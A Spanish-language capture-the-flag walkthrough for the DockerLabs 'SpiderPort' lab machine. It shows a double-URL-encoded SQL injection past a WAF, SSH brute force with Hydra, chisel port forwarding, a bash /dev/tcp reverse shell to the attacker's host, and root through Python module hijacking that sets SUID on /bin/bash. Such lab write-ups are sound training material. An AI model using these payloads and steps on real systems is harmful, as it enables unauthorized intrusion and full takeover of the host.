---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# SpiderPort DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip spiderport.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh spiderport.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 12:54 EDT
Nmap scan report for packer.pw (172.17.0.2)
Host is up (0.00043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:e7:a8:9f:4c:9e:9e:ff:75:62:e8:12:e3:b0:c8:18 (ECDSA)
|_  256 57:4a:62:d0:a2:d0:c0:63:e2:06:bf:10:cc:fd:26:42 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Spider-Verse Nexus
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds
```

Veremos el puerto `80` levantado, que generalmente aloja una pagina web, si entramos dentro veremos que efectivamente hay una pagina web con tecamtica de multiverso de super heroes, por lo que no veremos nada interesante, vamos a realizar un poco de `fuzzing` a ver que vemos.

Si nos vamos a `Contacto` veremos un correo de comunicacion, pero vemos interesante que tiene asociado un dominio llamado `spiderverse2099.local`, por lo que vamos a probar a meter dicho dominio en nuestro archivo `hosts` para ver si tuviera una pagina aparte en dicho dominio.

```shell
nano /etc/hosts

#Dentro del nano
<IP>           spiderverse2099.local
```

Lo guardamos y cargamos la pagina con el dominio de esta forma:

```
URL = http://spiderverse2099.local/
```

Veremos que nos carga la misma pagina, por lo que da igual el dominio, pero si nos vamos a la seccion de `Multiverso` veremos un `login`, probando algun `SQLi` veremos que nos da el siguiente mensaje:

```
User: ' OR 1=1-- -
Pass: ' OR 1=1-- -
```

Info:

```
Accede al núcleo del Spider-Verse para explorar otras dimensiones.

¡Entrada bloqueada por el WAF!
```

Nos esta diciendo que tiene un `WAF` controlando las entradas, vamos a intentar `Bypassear` dicho `WAF` a ver si lo conseguimos.

## Bypass del WAF

Probando algunos `payloads` codificados, veremos que este funciona:

```
User: %2527%2520OR%25201%253D1%252D%252D%2520-
Pass: %2527%2520OR%25201%253D1%252D%252D%2520-
```

Es una codificacion doble de `URL` del `payload` (`' OR 1=1-- -`), si metemos eso veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-05 190539.png" alt=""><figcaption></figcaption></figure>

Vemos que ha funcionado y obtendremos varias credenciales las cuales vamos a crear 2 diccionarios de contraseñas y usuarios, para probarlos en `SSH`.

> users.txt

```
peter
miles
gwen
```

> pass.txt

```
sp1der
m0ral3s
gw3n2025
```

## Escalate user peter

### Hydra

```shell
hydra -L users.txt -P pass.txt ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-05 13:08:38
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: peter   password: sp1der
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-05 13:08:42
```

Veremos que coincide unas credenciales, en este caso del usuario `peter`, por lo que vamos a conectarnos por `SSH`.

### SSH

```shell
ssh peter@<IP>
```

Metemos como contraseña `sp1der`...

```
peter@b2188aff6dfb:~$ whoami
peter
```

Veremos que estaremos dentro.

## Escalate user www-data

Si listamos la carpeta `/opt` veremos lo siguiente:

```
total 12
drwxrwxr-x 1 root spiderlab 4096 Sep  4 00:17 .
drwxr-xr-x 1 root root      4096 Sep  5 18:50 ..
-rwxr--r-- 1 root root       808 Sep  4 00:17 spidy.py
```

Vemos que hay un script que contiene lo siguiente:

```python
#!/usr/bin/env python3
# spidey_run.py - Spider-Man Python Lab

import os
import sys
import json
import math
def web_swing():
    print("🕷 Spider-Man se balancea por la ciudad.")
    print("Explorando los tejados y vigilando la ciudad...")

def run_tasks():
    print("🕸 Ejecutando tareas del día...")
    print("Saltos calculados:", math.sqrt(225))
    data = {"hero": "Spider-Man", "city": "New York"}
    print("Registro de datos:", json.dumps(data))

def fight_villains():
    villains = ["Green Goblin", "Doctor Octopus", "Venom"]
    print("Villanos en la ciudad:", ", ".join(villains))
    for v in villains:
        print(f"🕷 Enfrentando a {v}...")

if __name__ == "__main__":
    web_swing()
    run_tasks()
    fight_villains()
    print("✅ Spider-Man ha terminado su ronda.")
```

No veremos gran cosa en el script, pero en la carpeta `/opt` veremos que podremos modificar el script si fueramos el grupo `spiderlab`, por lo que vamos a seguir investigando.

Si vemos los puertos que hay a nivel interno, vemos lo siguiente:

```shell
ss -tuln
```

Info:

```
Netid          State           Recv-Q          Send-Q                     Local Address:Port                     Peer Address:Port          Process          
tcp            LISTEN          0               511                              0.0.0.0:80                            0.0.0.0:*                              
tcp            LISTEN          0               128                              0.0.0.0:22                            0.0.0.0:*                              
tcp            LISTEN          0               511                            127.0.0.1:8080                          0.0.0.0:*                              
tcp            LISTEN          0               128                                 [::]:22                               [::]:*
```

Vemos que hay un puerto `8080` a nivel interno, vamos a pasarnoslo a nuestro `host` realizando un `PortForwarding` con `chisel`.

```shell
cd /tmp
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
gunzip chisel_1.10.1_linux_amd64.gz
chmod +x chisel_1.10.1_linux_amd64 
mv chisel_1.10.1_linux_amd64 chisel
```

Echo esto vamos a levantar `chisel` en modo server desde la maquina `victima`.

```shell
chisel server -p 9999
```

Ahora desde la maquina `host` vamos a realizar lo mismo de antes, pero ejecutando este otro comando:

```shell
cd /tmp
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
gunzip chisel_1.10.1_linux_amd64.gz
chmod +x chisel_1.10.1_linux_amd64 
mv chisel_1.10.1_linux_amd64 chisel
```

```shell
chisel client <IP_VICTIM>:9999 8888:127.0.0.1:8080
```

Ahora si vamos a nuestro navegador y buscamos lo siguiente...

```
URL = http://127.0.0.1:8888/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-05 201735.png" alt=""><figcaption></figcaption></figure>

Veremos que ha funcionado y nos esta diciendo claramente que podemos ejecutar un comando, vamos a probar con `id`:

```
  Salida de: id

uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(spiderlab)
```

Veremos que funciona y somos el grupo que buscabamos, por lo que vamos a realizar una `reverse shell` de esta forma:

```shell
bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
```

Ahora nos pondremos a la escucha antes de enviarlo:

```shell
nc -lvnp <PORT>
```

Si enviamos el comando de antes y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.177.129] from (UNKNOWN) [172.17.0.2] 48744
bash: cannot set terminal process group (34): Inappropriate ioctl for device
bash: no job control in this shell
www-data@b2188aff6dfb:/var/www/internal$ whoami
whoami
www-data
```

Veremos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on b2188aff6dfb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on b2188aff6dfb:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/spidy.py
```

Vemos que podemos ejecutar el script `spidy.py` como el usuario `root`, por lo que vamos a investigar como escalar.

Si comprobamos las librerias a ver si existen en el sistema, veremos lo siguiente:

```shell
find / -name "os.py" 2>/dev/null
find / -name "sys.py" 2>/dev/null
find / -name "json.py" 2>/dev/null
find / -name "math.py" 2>/dev/null
```

Info:

```
/tmp/os.py
/usr/lib/python3.12/os.py
/tmp/math.py
```

Solamente veremos esto por lo que `sys` y `json` no las vemos en el sistema, vamos a probar con una tecnica llamada `Python Module Hijacking` con la libreria `json.py` de esta forma:

Ahora vamos a crear el `json.py` malicioso dentro del `/opt` ya que podremos crear archivos.

> json.py

```python
import subprocess

try:
    result = subprocess.run(["chmod", "u+s", "/bin/bash"], check=True, capture_output=True, text=True)
    print("✅ Permisos cambiados correctamente")
except subprocess.CalledProcessError as e:
    print("❌ Error al cambiar permisos:", e.stderr)
```

Ejecutaremos el script de esta forma:

```shell
sudo python3 /opt/spidy.py
```

Ahora si listamos la `bash` veremos lo siguiente:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Vemos que ha funcionado, por lo que escalaremos a `root` de esta forma:

```shell
bash -p
```

Info:

```
bash-5.2# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que habremos terminado la maquina.
